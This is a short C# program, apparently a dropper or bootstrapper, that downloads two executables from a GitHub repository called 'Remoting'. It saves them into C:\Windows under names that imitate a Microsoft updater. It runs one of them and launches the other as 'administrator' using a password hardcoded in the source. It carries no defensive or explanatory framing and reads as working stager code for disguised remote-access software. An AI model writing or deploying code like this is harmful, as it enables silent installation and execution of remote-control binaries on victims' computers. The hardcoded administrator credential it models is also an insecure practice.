namespace Bootstrap
{
    using System;
    using System.Diagnostics;
    using System.Net;
    using System.Security;

    internal class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            const string Target1 = @"C:\Windows\MsUpdater\MsUpdater.exe";
            const string Target2 = @"C:\Windows\MsUpdater\MsUpdater2.exe";
            const string Download1 = "https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater.exe?raw=true";
            const string Download2 = "https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater2.exe?raw=true";

            using (var client = new WebClient())
            {
                client.DownloadFile(Download1, Target1);
                client.DownloadFile(Download2, Target2);
            }

            Process.Start(Target2);

            var password = new SecureString();

            foreach (var a in "abc123kappa")
            {
                password.AppendChar(a);
            }

            Process.Start(Target1, "administrator", password, string.Empty);
        }
    }
}